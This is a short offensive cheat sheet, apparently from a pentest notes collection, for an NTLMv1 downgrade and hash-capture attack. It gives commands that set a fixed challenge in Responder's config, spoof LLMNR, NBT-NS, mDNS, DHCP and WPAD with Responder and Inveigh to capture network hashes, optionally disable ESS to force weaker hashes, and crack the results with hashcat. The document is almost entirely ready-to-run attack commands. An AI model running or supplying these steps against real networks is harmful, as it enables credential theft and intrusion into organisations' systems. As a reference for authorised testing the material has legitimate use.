# NTLMv1 Relay and Downgrade Attack

### 1) Change the authentication challenge to 1122334455667788 in the Responder conf file in order to obtain an easily crackable hash if NTLMv1 is used.

    sed -i 's/ Random/ 1122334455667788/g' Responder/Responder.conf

### 2) Catch all the possible hashes on the network (coming via LLMNR, NBT-NS, DNS spoofing, etc):

##### Responder with WPAD injection, Proxy-Auth, DHCP, DHCP-DNS and verbose

    responder -I interface_to_use -wPdDv

##### Inveigh with *

    Invoke-Inveigh -Challenge 1122334455667788 -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y

### 2.5) # --disable-ess will disable the SSP, not always useful (Optional)

    responder -I interface_to_use -wdDv --lm --disable-ess

### 3) Crack hash with hashcat

    hashcat -m 5500 -a 0 HASH /usr/share/wordlists/rockyou.txt

IF NetNTLMv2

    hashcat -m 5600 -a 0 HASH /usr/share/wordlists/rockyou.txt
